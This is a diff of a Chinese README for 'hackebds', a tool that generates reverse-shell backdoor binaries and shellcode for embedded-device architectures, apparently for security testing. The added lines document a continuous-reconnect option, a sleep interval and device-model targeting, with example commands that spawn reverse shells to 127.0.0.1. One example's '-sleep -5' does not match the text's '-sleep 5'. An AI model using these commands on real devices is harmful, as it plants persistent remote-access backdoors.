@@ -8,7 +8,7 @@
 ### 功能
 
 该工具嵌入到设备的安全测试中。主要有如下功能：
-1. 生成各种架构的**后门程序**（目前只支持生成ELF）。后门程序是用反向shell汇编代码打包的，大小很小，且纯静态封，装**现在支持Armv5、Armv7、Armv8、mipsel和mips，mips64，mips64el，powerpc，powerpc64，sparc，riscv64，mipsn32**，（反向shell在0.3.1版本后加入bash的支持），反向shell后门如果加入-power参数生成，那么会在目标机器上不断产生反向shell
+1. 生成各种架构的**后门程序**（目前只支持生成ELF）。后门程序是用反向shell汇编代码打包的，大小很小，且纯静态封，装**现在支持Armv5、Armv7、Armv8、mipsel和mips，mips64，mips64el，powerpc，powerpc64，sparc，riscv64，mipsn32**，（反向shell在0.3.1版本后加入bash的支持），反向shell后门如果加入-power参数生成，那么会在目标机器上不断产生反向shell，在0.3.7版本中不断创建反向shell的代码中加入的间隔时间可以通过-sleep参数加入，比如-sleep 5表示5秒创建一次反向shell，需要注意的是-power与-sleep需要一起使用
 
 2. 在攻击过程中生成各种架构的**反向shell代码** (同样是针对linux)，且无空字节，这有助于攻击嵌入式设备上的内存损坏漏洞**现在支持Armv5、Armv7、Armv8、mipsel和mips，mipsel64，aarch64，sparc，mipsn32仍在更新中**
 
@@ -68,16 +68,27 @@ ubuntu（debian）
 ### 怎么使用
 
 这里的ip地址与端口都是shell弹回的地址与port，导入此模块后pwn模块也会直接导入，无需再次导入
+
+
+
 #### 1. 生成对应各种架构的后门程序，纯shellcode封装（无需编译器的加入），回连shell成功概率大
 32为程序bind_shell中密码最多4个字符，64位程序最多8个字符
 使用命令行生成后门文件名、shellcode、binshell，cmd_file等
  ![image-20221206180431454](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221206180431454.png)
 
+重新设计了关于model与arch的关系，启用了再生成后门可以直接指定设备型号，但是型号需要与-l参数列出的名字一致
+
+```
+hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 -model DIR-816 -res reverse_shell_file
+```
+
+![image-20230710112652819](https://myblog-1257937445.cos.ap-nanjing.myqcloud.com/img/image-20230710112652819.png)
+
    ```
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode
    ```
 
-   ![image-20221102181217933](https://img-blog.csdnimg.cn/img_convert/8571f33df56a35983e368c777141ad54.png)
+![image-20221102181217933](https://img-blog.csdnimg.cn/img_convert/8571f33df56a35983e368c777141ad54.png)
 
    ```
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file
@@ -92,6 +103,12 @@ hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_she
 
 ```
 hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash -power
+```
+
+​	如果需要每5秒创建一次反向shell
+
+```
+hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 -arch mipsel -res reverse_shell_file -power -sleep -5
 ```
 
 ![image-20221102183017775](https://img-blog.csdnimg.cn/img_convert/660574b30d7ae810cc7b0d96a3a60bd2.png)
@@ -353,7 +370,7 @@ Powerpc, sparc: qemu
 
 2023.3.7 0.3.6 加入了针对于mipsn32架构的支持（此架构在zyxel防火墙等设备中可能会遇到）
 
-2023.5.30 0.3.7 加入对CVE的检索，添加设备信息中的EXP，POC文件内容输出
+2023.5.30 0.3.7 加入对CVE的检索，添加设备信息中的EXP，POC文件内容输出，更新armelv5的反向shell文件后门代码，加入-sleep参数针对反向shell的创建间隔
 
 
 
